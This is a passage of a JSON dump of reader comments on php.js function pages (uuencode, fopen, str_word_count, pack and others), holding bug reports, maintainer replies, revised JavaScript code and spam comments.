{\n            bytes = str.substr(u, 45);\n            for(i in bytes) {\n                bytes[i] = bytes[i].charCodeAt(0);\n            }\n            if(bytes.length != 0) {\n                return bytes.length;\n            } else {\n                return 0;\n            }\n        };\n        \n        while(chunk() !== 0) {\n            c = chunk();\n            u += 45;\n\n            while(c % 3) {\n                bytes[c++] = char(0);\n            }\n\n            \/\/ New line encoded data starts with number of bytes encoded.\n            encoded += char(c+32);\n\n            \/\/ Convert each char in bytes[] to a byte\n            for(i in bytes) {\n                tmp1 = bytes[i].charCodeAt(0).toString(2);\n                while(tmp1.length < 8) {\n                    tmp1 = \"0\" + tmp1;\n                }\n                tmp2 += tmp1;\n            }\n\n            for(i=0; i<=(tmp2.length\/6)-1; i++) {\n                tmp1 = tmp2.substr(a, 6);\n                if(tmp1 == \"000000\") {\n                    encoded += char(96);\n                } else {\n                    encoded += char(parseInt(tmp1, \"2\")+32);\n                }\n                a += 6;\n            }\n\n            encoded += \"\\n\";\n        }\n        \n    \/\/ Add termination characters\n    encoded += char(96)+\"\\n\";\n\n    return encoded;\n}\n[\/CODE]"},{"date":"2009-04-26 15:57:01","author":"Ole Vrijenhoek","url":"www.nervous.nl","comment":"hm, found a bug XD\n[CODE]\nfunction convert_uuencode(str){\n\n    \/\/ shortcut\n    var char = function(c) {\n        return String.fromCharCode(c);\n    };\n\n    if(!str || str==\"\") {\n        return char(0);\n    } else if(!is_scalar(str)) {\n        return false;\n    }\n\n    var c = 0, u = 0, i = 0, a = 0\n    var encoded = \"\", tmp1 = \"\", tmp2 = \"\", bytes = {};\n\n    \/\/ divide string into chunks of 45 characters\n    var chunk = function() {\n        bytes = str.substr(u, 45);\n        for(i in bytes) {\n            bytes[i] = bytes[i].charCodeAt(0);\n        }\n        if(bytes.length != 0) {\n            return bytes.length;\n        } else {\n            return 0;\n        }\n    };\n        \n    while(chunk() !== 0) {\n        c = chunk();\n        u += 45;\n\n        \/\/ New line encoded data starts with number of bytes encoded.\n        encoded += char(c+32);\n\n        \/\/ Convert each char in bytes[] to a byte\n        for(i in bytes) {\n            tmp1 = bytes[i].charCodeAt(0).toString(2);\n            while(tmp1.length < 8) {\n                tmp1 = \"0\" + tmp1;\n            }\n            tmp2 += tmp1;\n        }\n\n        while(tmp2.length % 6) {\n            tmp2 = tmp2 + \"0\";\n        }\n\n        for(i=0; i<=(tmp2.length\/6)-1; i++) {\n            tmp1 = tmp2.substr(a, 6);\n            if(tmp1 == \"000000\") {\n                encoded += char(96);\n            } else {\n                encoded += char(parseInt(tmp1, \"2\")+32);\n            }\n            a += 6;\n        }\n        a = 0, tmp2 = \"\";\n        encoded += \"\\n\";\n    }\n        \n    \/\/ Add termination characters\n    encoded += char(96)+\"\\n\";\n\n    return encoded;\n}\n[\/CODE]"},{"date":"2012-04-10 09:51:54","author":"????? ????? ???","url":"http:\/\/an3m1.com\/","comment":"I agree it is a very informative article and I actually enjoy reading good stuff unlike all the crap out there on the internet "}],"fopen":[{"date":"2010-05-14 18:38:24","author":"Serg","url":"","comment":"when i used your code I had an error ;\n<<Error: this.file_get_contents is not a function>>;\nI could not solve it;\nIf you know about it something pleas tell me about\nthanks\np.s.\nsorry for my English "},{"date":"2010-05-14 20:43:55","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Serg: This function has dependencies. You'll need to get those as well."},{"date":"2010-09-20 00:08:44","author":"Sr. Polo","url":"","comment":"See dependencies"},{"date":"2011-09-19 10:48:36","author":"todd","url":"","comment":"don't run"},{"date":"2011-09-19 20:52:52","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@todd: This has to be on the same domain, and it is not meant to load from the local file system (which is not allowed except to privileged JavaScript, something which has unfortunately been becoming a contradiction in client-side JavaScript)."},{"date":"2011-11-05 12:40:51","author":"Paul Wratt","url":"","comment":"hmm.. maybe if you are dumping PHP into JS tags, this function is OK, you should get a valid pointer if the file exists..\n\n.. but from a client-side http: JS perspective, this function has no other use, as it does not return the actual page\/code requested.. which is similar to PHP, use the \"dependency\" instead.. ('file_get_contents')\n\nbtw how does this code depend on 'file_get_contents' (except as I just pointed out), as it contains its own 'file_get_contents' function..\n\nhmm.. maybe if combined with fread($fp) it would allow standard code to operate correctly..(reading 'stream' from '.resourceData')\n\ninteresting, and good for completeness & thoroughness"},{"date":"2012-04-11 15:47:19","author":"???? ????????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas "}],"is_resource":[{"date":"2009-05-28 19:51:05","author":"Luis Salazar","url":"www.freaky-media.com","comment":"Hi, great!!\n\nJust one thing. Is there any special reason for using the brackets in this case, or can we just do :\n\n[CODE]\nreturn !(!handle || typeof handle !== 'object' || !handle.constructor || handle.constructor.name !== 'PHPJS_Resource');\n[\/CODE]\n\nThanks a lot!! "},{"date":"2009-05-29 00:38:57","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Good one!  Changed in SVN."}],"str_word_count":[{"date":"2009-06-13 01:18:53","author":"Chris","url":"","comment":"This function doesn't work quite like PHP's in that it fails to count each single Chinese character as an entire word, eg.:\n\n?? hello ?\n\nIs four words..."},{"date":"2009-06-18 08:03:12","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"I believe that to do this correctly for not only Chinese but other languages, we'll need to take a good look at the source code, specifically for PHP 6, since that is where full Unicode support is being added.\n\nWe might be able to use XRegExp (see http:\/\/stevenlevithan.com\/regex\/xregexp\/ ) and its Unicode plug-in (at http:\/\/blog.stevenlevithan.com\/archives\/xregexp-unicode-plugin ) for our preg_ functions and then make str_word_count() dependent on it, though that won't really help determine what a \"word\" is (since, in Chinese, a character is technically only a graphical morpheme, and not necessarily also an independent word), though at least it will tell us definitively what a \"letter\" is. Of course, we can just go back to the source to see how PHP interprets a \"word\" since we're aiming for that anyways, but again, that will take some work, especially if we wish to make it work for other languages as well as Chinese. I'm pretty busy for now, but feel free to take a shot at it if you like.\n\nFYI, as you can see by your Chinese characters getting mangled, the site is having some problems at the moment with Unicode characters, so if you need to refer to any in the future, maybe you could try using entities or the JavaScript Unicode escape sequences instead (e.g., \\u0020). But I think the issue is beyond just Chinese (though Chinese in particular also raises the particular need for also handling characters beyond the Basic Multilingual Plane (BMP) since some Chinese characters fall beyond this plane--in JavaScript, such characters must be represented by two Unicode characters called surrogates (characters which are not used outside of such pairs), so we can't rely on the length of the string--see http:\/\/phpjs.org\/functions\/strlen for a solution)."},{"date":"2010-02-03 12:12:59","author":"Bug?","url":"","comment":"The javascript function returns 5 words for this string:\n\n[code]\nLorem ipsum dolor asdf asdf asdf\n[\/code]\n\nAnd 6 words for this one:\n\n[code]\nLorem ipsum dolor asdf asdf asdf.\n[\/code]\n\nThe PHP function returns 6 for both.\n\nCheers,\n\nChris"},{"date":"2010-02-13 08:29:31","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Bug?: Yes, you are correct. Thanks for the feedback. I have now fixed it in Git: http:\/\/github.com\/kvz\/phpjs\/raw\/master\/functions\/strings\/str_word_count.js . Note that the new version requires ctype_alpha now (and which I also needed to update now along with a lot of other functions dependent on RegExp.test()), and that function depends on setlocale() because this function should check in a way that potentially supports what other locales consider a word. I also added support for the very rare non-BMP characters, and as per PHP, allowed hyphens in the middle or apostrophes at the middle or end (and everywhere if the charlist includes these)."}],"aggregate_methods_by_list":[{"date":"2011-06-28 07:55:16","author":"efrqe","url":"qergqerg","comment":"ergh2tnbwrg"}],"aggregate_methods_by_regexp":[{"date":"2012-04-10 09:53:26","author":"????? ?????? ? ?????","url":"http:\/\/an3m1.com\/","comment":"I wonder how you got so good. HaHa ! This is really a fascinating blog, lots of stuff that I can get into. One thing I just want to say is that your design is so perfect ! You certainly know how to get a girls attention ! I\u2019m glad that you\u2019re here. I feel like I\u2019ve learned something new by being here "},{"date":"2012-08-24 12:16:29","author":"how to find your true love in the least time","url":"www.lookingfor-love.com ","comment":"now i can use PHP in java files.....wow thats a great help that i was looking forward to. Now i can play more with these codes. I hope i get to read more of this kind of work. "},{"date":"2012-09-19 11:55:19","author":"hackedemailsupport.com","url":"www.hackedemailsupport.com","comment":"This JavaScript aggregate method you have posted sounds good and easy for me. This is a great help that I was looking for. Now I can do the codes more effectively. Thank you for the useful post."},{"date":"2012-09-20 16:19:31","author":"penguin-webdesign.com","url":"www.penguin-webdesign.com","comment":"The program that you have posted seemed very lengthy and tedious at the first look. However, analyzing it carefully, I realized that the logic was quite simple. Thank you for sharing this valuable piece   of information with us."}],"aggregate_properties_by_list":[{"date":"2012-04-23 14:47:34","author":"??????? ????? ???","url":"http:\/\/an3m1.com\/","comment":"They have done such a great job with this. This is why they are deserving of these awards. Keep up the good work. \n"}],"aggregate_properties_by_regexp":[{"date":"2012-03-22 13:55:24","author":" ????? ???????","url":"http:\/\/an3m1.com\/","comment":" i really like\nNews of new and exclusive in the world of cars\n"}],"fgetcsv":[{"date":"2011-11-27 16:56:13","author":"N.Neuman","url":"nneuman.net","comment":"[CODE]\nfullline = this.php_js.resourceData[handle.id].slice(start, this.php_js.resourceData[handle.id].indexOf('\\n', start) + 1);\n[\/CODE]\nI would change \\n to \\r\\n as in a spreadsheet, \\r\\n is the end of a line whereas \\n is a new line that is legitimate in the middle of a cell."},{"date":"2011-12-02 20:54:48","author":"Theriault","url":"","comment":"@N.Neuman: You are correct that this function is broken, but based on this spec (http:\/\/tools.ietf.org\/html\/rfc4180), a CRLF (\\r\\n) can appear inside a field also. In order to fix this function, it needs to find a CRLF outside of double-quotation marks to be the EOL. Additionally, I'd likely keep it searching only for a LF (\\n) also, as Unix-like systems usually only use this character for EOL. Thank you for finding this. I'll see if I can fix it later."},{"date":"2012-04-18 10:16:16","author":"????? ???","url":"http:\/\/an3m1.com\/","comment":"I have a lot to benefit from this article and thank you for this wonderful effort to this article and will continue my many articles you have other   \n"}],"fgetss":[{"date":"2012-04-24 15:48:18","author":"eenicker","url":"","comment":"<a href=><\/a>"}],"readfile":[{"date":"2011-09-24 23:29:15","author":"jorge","url":"","comment":"it don't read aspx files"},{"date":"2011-09-25 18:16:51","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"It will read any file as long as it is placed on the same domain."}],"register_shutdown_function":[{"date":"2011-08-15 07:37:29","author":"Dzhohannakix","url":"","comment":""},{"date":"2011-09-09 09:35:40","author":"Tarusikllmhbx","url":"","comment":""},{"date":"2011-09-13 20:49:55","author":"Boyclewweic","url":"","comment":""},{"date":"2011-09-14 22:30:27","author":"NeSMali","url":"","comment":""},{"date":"2011-10-07 01:58:31","author":"ToonyThockGox","url":"","comment":""},{"date":"2011-10-10 06:35:42","author":"Paulinakix","url":"","comment":""},{"date":"2011-10-11 06:47:04","author":"Soaliapam","url":"","comment":""},{"date":"2011-10-24 15:03:55","author":"Zetemogma","url":"","comment":""},{"date":"2011-10-29 18:43:17","author":"empoxia","url":"","comment":""},{"date":"2011-11-22 19:05:36","author":"Rupleveflaf","url":"","comment":""},{"date":"2011-11-26 15:18:35","author":"Rhondakix","url":"","comment":""},{"date":"2011-12-09 08:46:29","author":"GrantXM","url":"","comment":""},{"date":"2011-12-09 15:53:06","author":"sametikaresi","url":"","comment":""},{"date":"2011-12-17 23:35:41","author":"Fluommils","url":"","comment":""},{"date":"2011-12-19 06:38:20","author":"Flictiori","url":"","comment":""},{"date":"2011-12-21 18:42:19","author":"Hohlopalod","url":"","comment":""},{"date":"2011-12-26 00:49:27","author":"WAvalenzuelaFF ","url":"","comment":""},{"date":"2012-01-09 20:37:55","author":"BeeGirll","url":"","comment":""},{"date":"2012-02-05 03:51:06","author":"arrariamen","url":"","comment":""},{"date":"2012-02-06 07:07:01","author":"Unodeepinna","url":"","comment":""},{"date":"2012-02-06 07:37:10","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"test"},{"date":"2012-02-12 03:45:38","author":"insild","url":"http:\/\/maindir.ru\/","comment":""},{"date":"2012-02-26 18:57:32","author":"JosmogyfugHof","url":"","comment":""},{"date":"2012-03-18 02:31:18","author":"Effowsgaw","url":"","comment":""},{"date":"2012-03-23 13:32:47","author":"Redlinia","url":"","comment":""},{"date":"2012-04-10 21:22:39","author":"hieshibre","url":"","comment":""},{"date":"2012-04-14 13:46:34","author":"Yuerssstobed","url":"","comment":""},{"date":"2012-04-16 18:28:59","author":"nawaygcs","url":"","comment":""},{"date":"2012-04-18 19:49:59","author":"hieshibre","url":"http:\/\/other.moynet.ru","comment":""},{"date":"2012-04-19 13:54:57","author":"Yuerssstobed","url":"","comment":""},{"date":"2012-05-01 16:45:58","author":"SnunniSanuh","url":"","comment":""},{"date":"2012-05-24 01:00:41","author":"hieshibre","url":"","comment":""},{"date":"2012-06-08 12:16:41","author":"hieshibre","url":"http:\/\/films.tvoyinet.ru","comment":""},{"date":"2012-07-12 13:32:15","author":"masharblem","url":"","comment":""},{"date":"2012-07-14 17:09:04","author":"ludkaBiob","url":"","comment":""},{"date":"2012-07-15 16:58:30","author":"mashafdSaf","url":"","comment":""},{"date":"2012-07-16 03:26:24","author":"mashafdSaf","url":"","comment":""},{"date":"2012-07-18 06:07:11","author":"ivanovasor","url":"","comment":""},{"date":"2012-08-07 10:49:28","author":"hieshibre","url":"","comment":""},{"date":"2012-08-15 12:24:52","author":"hieshibre","url":"http:\/\/oboi.vsefreee.ru","comment":""},{"date":"2012-08-21 22:11:30","author":"Enuple","url":"http:\/\/ya.ru\/","comment":""},{"date":"2012-08-25 10:31:57","author":"amerheaxy","url":"http:\/\/googla.com","comment":""},{"date":"2012-08-31 22:46:18","author":"BydayDaps","url":"","comment":""},{"date":"2012-09-03 05:57:19","author":"embedadoroump","url":"","comment":""},{"date":"2012-09-03 14:13:38","author":"embedadoroump","url":"","comment":""},{"date":"2012-09-04 11:15:56","author":"Opequalieniep","url":"","comment":""}],"str_getcsv":[{"date":"2012-03-16 16:50:17","author":"Marques Johansson","url":"","comment":"[CODE]\nstr_getcsv(\"'one','two with escaped \\' single quote', 'three, with, commas',\",  ',', \"'\", '\\\\');\n[\"one\", \"two with escaped ' single quote\", \"three, with, commas',\"]\n\/\/ The single quote + comma should not be included in the last part\n\n \n\n[\/CODE]"},{"date":"2012-06-13 23:43:29","author":"Jason Butz","url":"http:\/\/jasonbutz.info","comment":"The following is not handled correctly.\n[code]\nstr_getcsv('\"0\",\"Text 1\",0,0,0,0,0,\"Text2\"');\n[\/code]\n\nIt is parsed to\n[code]\n[\n   '0',\n   '\"Text 1\",0,0,0,0,0,\"Text2\"'\n]\n[\/code]\n\nIt should be\n\nIt is parsed to\n[code]\n[\n   '0',\n   'Text 1',\n   '0',\n   '0',\n   '0',\n   '0',\n   '0',\n   'Text2'\n]\n[\/code]\n\nI am ignoring types, but I think you should get the idea. I'm not even I would consider types important."}],"substr_replace":[{"date":"2012-04-23 14:49:13","author":" ????? ????????","url":"http:\/\/an3m1.com\/","comment":"Great job here. I really enjoyed what you had to say. Keep going because you definitely bring a new voice to this subject. Not many people would say what you\u2019ve said and still make it interesting\n \n"}],"idate":[{"date":"2010-01-19 07:31:39","author":null,"url":"","comment":"For some reason, JSLint wants the cases of a switch statement to be lined up with the switch statement itself:\r\n[CODE]\r\nswitch (expression) {\r\ncase 1:\r\n    ...\r\ncase 2:\r\n    ...\r\n}\r\n[\/CODE]\r\n\r\n...instead of the more readable....\r\n\r\n[CODE]\r\nswitch (expression) {\r\n    case 1:\r\n        ...\r\n    case 2:\r\n        ...\r\n}\r\n[\/CODE]\r\n\r\nI don't understand why it wants this."},{"date":"2010-01-20 10:49:22","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"JSLint, as good as it is, really needs more configuration options. I would venture a guess that maybe the reason is because the indents at the end are otherwise confusing:\n\n[CODE]switch(v) {\n    case 'a':\n        break;\n    default:\n\n...lots of stuff here...\n\n\n        break;\n   \/\/ Might be tempting to put ending bracket here \n  \/\/ or add one here since the indent before this line \n  \/\/ is twice as much as the next\n}\n[\/CODE]\n\nThat being said, I don't like all of JSLint's provisions, including this one, as well as even the one forbidding fall-throughs. There has to be room for different coding styles too. I bet Douglas Crockford may be open to patches which did allow configuration if someone submitted the patches..."}],"array_multisort":[{"date":"2011-09-09 23:11:02","author":"Jason B","url":"http:\/\/jasonbutz.info","comment":"A warning to people: If you are using this to sort an associative array\/object your results will be inconsistent between Chrome and Firefox. I didn't compare these two with IE."},{"date":"2011-09-10 10:49:01","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Jason B: Yes, sorry but with the fact that newer browsers on the scene disregarded the Firefox convention of preserving object iteration order (it's only implementation-dependent per the ECMAScript spec)--and since IE hadn't supported it with perfect fidelity anyways (if you ever deleted properties anyways), we have started adding an option to the array functions to use a more awkward construction to build associative arrays (\"{key1:value1}, {key2:value2}, ...\"), but it has not been fully deployed. See the array() source code for the PHPJS_Array class begun to offer this support. I've unfortunately been too busy to do much documentation or expansion of it."},{"date":"2012-04-11 15:37:16","author":"????? ????? ????","url":"http:\/\/an3m1.com\/","comment":"This is a very informative article. I was looking for these things and here I found it. I am doing a project and this information is very useful me. Some things in here I have not thought about before\n "}],"quoted_printable_decode":[{"date":"2012-08-07 16:43:33","author":null,"url":"","comment":"This does not support non-ascii characters.\r\nE. g.:\r\n\u00e1rv\u00edzt\u0171r\u0151 -encode-> =C3=A1rv=C3=ADzt=C5=B1r=C5=91 -this-decoder-> \u00c3\u00a1rv\u00c3\u00adzt\u00c5\u00b1r\u00c5\u0091"}],"quoted_printable_encode":[{"date":"2012-05-06 09:30:22","author":"??????? ????? ???","url":"http:\/\/an3m1.com\/","comment":"They have done such a great job with this. This is why they are deserving of these awards. Keep up the good work.  \n"}],"version_compare":[{"date":"2010-05-28 23:51:20","author":"Scott Baker","url":"http:\/\/www.perturb.org","comment":"This may be nit picky, but I've seen version numbers with leading zeros as filler. This breaks this compare.\n\nCorrect:\n[CODE]version_compare('4.1.0.52','4.1.0.52') = 0[\/CODE]\n\nNot Correct:\n[CODE]version_compare('4.1.0.52','4.01.0.51') = 0\nversion_compare('4.1.0.52','4.01.0.51','>') = false[\/CODE]"},{"date":"2010-05-30 01:30:40","author":null,"url":"","comment":"@Scott Baker: Thank you for finding this. I fixed this and went ahead and fixed a few other bugs I found in this function (you can never be too nit picky), including:\r\n- An empty string is acceptable as a version number. (Currently throws an error.) An empty string should always be less-than a non-empty string (PHP behavior).\r\n- Both the operators and the version words were being treated as case-insensitive when PHP treats them as case-sensitive.\r\n- An invalid operator should make the function return null instead of using the \"<\" operator as a fallback.\r\n\r\nThe code has also been reduced by many lines and documented better. You can get the updated code here http:\/\/github.com\/kvz\/phpjs\/raw\/master\/functions\/info\/version_compare.js before it is updated on the main website."},{"date":"2012-04-17 15:29:36","author":" ????? ????? ????","url":"http:\/\/an3m1.com\/","comment":"This is a very informative article. I was looking for these things and here I found it. I am doing a project and this information is very useful me. Some things in here I have not thought about before\n\n"}],"metaphone":[{"date":"2011-05-05 23:15:18","author":"Rey","url":"","comment":"The following term returns different results on php and js:\n\nChick-fil-A\n\nPHP result:\nXKFL\n\nJS:\nKKFL\n\nI'm not sure which one is correct."},{"date":"2011-05-06 08:13:07","author":"Rafa? Kukawski","url":"","comment":"@Rey: yeah, the metaphone requires a big cleanup and some bug fixing. But the PHP implementation isn't bug free, nor does it follow the metaphone \"specs\". There are some differences.\nI did a rewrite of the function, that you can see on github https:\/\/github.com\/kvz\/phpjs\/raw\/master\/_workbench\/strings\/metaphone.js You can check if this one suits your needs (it lacks phonemes param support, but that's easy to do). The problem is, it's difficult to test if a metaphone implementation works correctly. For many cases also the current implementation works, but as you've proven it's not bug free.\nI will try to unit test that one ASAP make it a final release."},{"date":"2011-05-06 09:13:06","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Rey: According to the original BASIC implementation of metaphone at http:\/\/aspell.net\/metaphone\/metaphone.basic (though not mentioned in summaries of the algorithm such as http:\/\/en.wikipedia.org\/wiki\/Metaphone ), \"Ch\" at the beginning of a word and then followed by a vowel should produce \"k\". It seems to depend on what metaphone version is being targeted (see http:\/\/aspell.net\/metaphone\/ ). The PHP source code had a \"traditional\" flag, apparently to distinguish this original algorithm from others, but this was not apparently exposed anywhere in the public API.\n\nPractically speaking, there are examples like \"Character\", \"Charisma\", and \"Chyme\" where \"k\" makes sense, but other counter-examples like \"Check\", \"Chick\", \"Chinese\", \"Chore\", etc. which might indicate otherwise (seems 'e', 'i', 'o' should have been distinguished from other vowels based on this sample anyways, though there is also \"Chad\").\n\nI went with the original algorithm, thinking http:\/\/bugs.php.net\/bug.php?id=48711 might end up getting PHP to follow the original.\n\nLines 114-118 in our code deal with this, so feel free to alter it in your own copy, as this seems up for grabs to me (though maybe we should revert to PHP behavior, allowing configuration to allow the deviation until such time as PHP itself may resolve the issue)."},{"date":"2011-06-04 21:35:36","author":"Lawrence Philips","url":"http:\/\/www.amorphics.com\/","comment":"re: correct implementations of metaphone, specifically whether to code \"CH-<vowel>\" as K or X\n\nThis is in fact an incredibly complicated question, since the number of exceptions in the pronunciation of consonants and consonant groups in English is huge. These issues are only really addressed correctly in the third generation of the Metaphone algorithm, Metaphone 3"}],"_phpjs_shared_bc":[{"date":"2010-11-23 12:22:10","author":"Stuart","url":"","comment":"On line 969: diff.n_value[diffptr--] = val;\nI think that should be outside the if\/else block. With the existing code, when you subtract a larger number with a smaller scale from a smaller number the scale is off. e.g.:\nbcsub('2303.94','3000',2); \/\/returns -6.96 which is wrong.\n\nwith the change listed above:\nbcsub('2303.94','3000',2); \/\/returns -696.06 which is right.\n"}],"bcsub":[{"date":"2011-11-22 03:29:01","author":"justin","url":"","comment":"why bcsub(4.136,4.14,4)=-0.0000? the right result is -0.0040"}],"money_format":[{"date":"2009-10-14 16:45:28","author":"daniel airton wermann","url":"http:\/\/wermann.com.br","comment":"Hi!\nExcuse me, but I've found a bug (or not?).\nLook this: \n[CODE]money_format('%i', 134.56);[\/CODE]\n\nIt's returns:  [CODE]USD ,134.56[\/CODE]\n\nAnybody help me?"},{"date":"2009-10-14 19:09:19","author":"daniel airton wermann","url":"http:\/\/wermann.com.br","comment":"A bug occurs when use it on Internet Explorer.\nI don't know what the problem, but the returns of the function in IE doesn't the same as on Firefox for example.\nIn IE:\n[code]3,590.[\/code]\nIn FF:\n[code]3,590.00[\/code]\n\nSecond bug, please help!"},{"date":"2009-10-16 02:35:42","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@daniel: I believe I have fixed the two issues you raised. One was due to regular expression functions giving the empty string in Firefox and \"undefined\" in IE for missing arguments (was only checking for empty string), while the other problem was due to the fact that I was adding the thousands separator with numbers less than a thousand (thus the comma). These should now both be fixed in Git: http:\/\/github.com\/kvz\/phpjs\/commit\/2a379948ebd70f40a017f43b4e5127447484eebb .\n\nThere are two other issues possibly remaining:\n1) PHP, as I recall, may differ in the default (English) locale as to whether \"USD\" is used for the international currency default or nothing. In our setlocale() implementation, it does. This is set in the line:\n[CODE]phpjs.locales.en_US.LC_MONETARY.int_curr_symbol[\/CODE]\nWe should probably look into which locales use this and which use nothing as the \"international\" symbol.\n2) I understood from the documentation that padding should be left to make space for alignment with numbers which have a (negative) sign, so there is a space added (perhaps in the wrong place too) at the beginning of the number, whereas in PHP, it doesn't seem to add a space. \n\nI only put out money_format() recently, and I didn't find the documentation out there particularly clear, so it wouldn't surprise me if there are a few bugs left to work out. Hopefully, it is close enough to be worth fixing the bugs as they're discovered."},{"date":"2009-10-25 13:44:55","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Did I mention yet you were the man?\nWell, you are."}],"pack":[{"date":"2009-12-21 20:41:21","author":"Tim de Koning","url":"http:\/\/www.kingsquare.nl\/","comment":"Hi guys,\n\nI've resolved the JS lint issues and fixed some bugs. Thanks for the feedback. The new version:\n\n[CODE]\nfunction pack(format) {\n    \/\/ http:\/\/kevin.vanzonneveld.net\n    \/\/ +   original by: Tim de Koning (http:\/\/www.kingsquare.nl)\n    \/\/ +      parts by: Jonas Raoni Soares Silva\n    \/\/ +      http:\/\/www.jsfromhell.com\n    \/\/ %        note 1: Float encoding by: Jonas Raoni Soares Silva\n    \/\/ %        note 2: Home: http:\/\/www.kingsquare.nl\/blog\/12-12-2009\/13507444\n    \/\/ %        note 3: Feedback: phpjs-pack@kingsquare.nl\n    \/\/ %        note 4: 'machine dependant byte order and size' aren't\n    \/\/ %        note 5: applicable for JavaScript pack works as on a 32bit,\n    \/\/ %        note 6: little endian machine\n    \/\/ *     example 1: pack(\"nvc*\", 0x1234, 0x5678, 65, 66);\n    \/\/ *     returns 1: '<null>4xVAB'\n\n    var formatPointer = 0,\n        argumentPointer = 1,\n        result = '',\n        argument = '',\n        i = 0,\n        r = [],\n        instruction, quantifier, word, precisionBits,\n        exponentBits, extraNullCount;\n\n    \/\/vars used by float encoding\n    var bias, minExp, maxExp, minUnnormExp, status, exp, len, bin,\n        signal, n, intPart, floatPart, lastBit, rounded, j, k, tmpResult;\n\n    while (formatPointer < format.length) {\n        instruction = format[formatPointer];\n        quantifier = '';\n        formatPointer++;\n        while ((formatPointer < format.length) &&\n              (format[formatPointer].match(\/[\\d\\*]\/) !== null)) {\n            quantifier += format[formatPointer];\n            formatPointer++;\n        }\n        if (quantifier === '') {\n            quantifier = '1';\n        }\n        \n        \/\/now pack variables: 'quantifier' times 'instruction'\n        switch (instruction) {\n        case 'a': \/\/NUL-padded string            \n        case 'A': \/\/SPACE-padded string\n\n            if (typeof arguments[argumentPointer] === 'undefined') {\n                throw new Error('Warning:  pack() Type ' + instruction +\n                       ': not enough arguments');\n            } else {\n                argument = String(arguments[argumentPointer]);\n            }\n            if (quantifier === '*') {\n                quantifier = argument.length;\n            }\n            for (i = 0; i < quantifier; i ++) {\n                if (typeof argument[i] === 'undefined') {\n                    if (instruction === 'a') {\n                        result += String.fromCharCode(0);\n                    } else {\n                        result += ' ';\n                    }\n                } else {\n                    result += argument[i];\n                }\n            }\n            argumentPointer++;\n            break;\n        case 'h': \/\/Hex string, low nibble first\n        case 'H': \/\/Hex string, high nibble first\n            if (typeof arguments[argumentPointer] === 'undefined') {\n                throw new Error('Warning: pack() Type ' + instruction +\n                        ': not enough arguments');\n            } else {\n                argument = arguments[argumentPointer];\n            }\n            if (quantifier === '*') {\n                quantifier = argument.length;\n            }\n            if (quantifier > argument.length) {\n                throw new Error('Warning: pack() Type ' + instruction +\n                        ': not enough characters in string');\n            }\n            for (i = 0; i < quantifier; i += 2) {\n                \/\/always get per 2 bytes...\n                word = argument[i];\n                if (((i + 1) >= quantifier) ||\n                        typeof(argument[i + 1]) === 'undefined') {\n                    word += \"0\";\n                } else {\n                    word += argument[i + 1];\n                }\n                \/\/the fastest way to reverse?\n                if (instruction === 'h') {\n                    word = word[1] + word[0];\n                }\n                result += String.fromCharCode(parseInt(word, 16));\n            }\n            argumentPointer++;\n            break;\n\n        case 'c': \/\/signed char\n        case 'C': \/\/unsigned char\n            \/\/c and C is the same in pack\n            if (quantifier === '*') {\n                quantifier = arguments.length - argumentPointer;\n            }\n            if (quantifier > (arguments.length - argumentPointer)) {\n                throw new Error('Warning:  pack() Type ' + instruction +\n                        ': too few arguments');\n            }\n\n            for (i = 0; i < quantifier; i++) {\n                result += String.fromCharCode(arguments[argumentPointer]);\n                argumentPointer++;\n            }\n            break;\n\n        case 's': \/\/ signed short (always 16 bit, machine byte order)\n        case 'S': \/\/ signed short (always 16 bit, machine byte order)\n        case 'v':\n            \/\/s and S is the same in pack\n            \/\/but can machine byte order be retrieved in javascript?\n            \/\/this is default byte order anywayz...\n            if (quantifier === '*') {\n                quantifier = arguments.length - argumentPointer;\n            }\n            if (quantifier > (arguments.length - argumentPointer)) {\n                throw new Error('Warning:  pack() Type ' + instruction +\n                        ': too few arguments');\n            }\n\n            for (i = 0; i < quantifier; i++) {\n                result += String.fromCharCode(arguments[argumentPointer] &\n                        0xFF);\n                result += String.fromCharCode(arguments[argumentPointer] >>\n                        8 & 0xFF);\n                argumentPointer++;\n            }\n            break;\n\n        case 'n': \/\/ unsigned short (always 16 bit, big endian byte order)\n            if (quantifier === '*') {\n                quantifier = arguments.length - argumentPointer;\n            }\n            if (quantifier > (arguments.length - argumentPointer)) {\n                throw new Error('Warning:  pack() Type ' + instruction +\n                        ': too few arguments');\n            }\n\n            for (i = 0; i < quantifier; i++) {\n                result += String.fromCharCode(arguments[argumentPointer] >>\n                        8 & 0xFF);\n                result += String.fromCharCode(arguments[argumentPointer] &\n                        0xFF);\n                argumentPointer++;\n            }\n            break;\n\n        case 'i': \/\/ signed integer (machine dependent size and byte order)\n        case 'I': \/\/ unsigned integer (machine dependent size and byte order)\n        case 'l': \/\/ signed long (always 32 bit, machine byte order)\n        case 'L': \/\/ unsigned long (always 32 bit, machine byte order)\n        case 'V': \/\/ unsigned long (always 32 bit, little endian byte order)\n            if (quantifier === '*') {\n                quantifier = arguments.length - argumentPointer;\n            }\n            if (quantifier > (arguments.length - argumentPointer)) {\n                throw new Error('Warning:  pack() Type ' + instruction +\n                        ': too few arguments');\n            }\n\n            for (i = 0; i < quantifier; i++) {\n                result += String.fromCharCode(arguments[argumentPointer] &\n                        0xFF);\n                result += String.fromCharCode(arguments[argumentPointer] >>\n                        8 & 0xFF);\n                result += String.fromCharCode(arguments[argumentPointer] >>\n                        16 & 0xFF);\n                result += String.fromCharCode(arguments[argumentPointer] >>\n                        24 & 0xFF);\n                argumentPointer++;\n            }\n\n            break;\n        case 'N': \/\/ unsigned long (always 32 bit, big endian byte order)\n            if (quantifier === '*') {\n                quantifier = arguments.length - 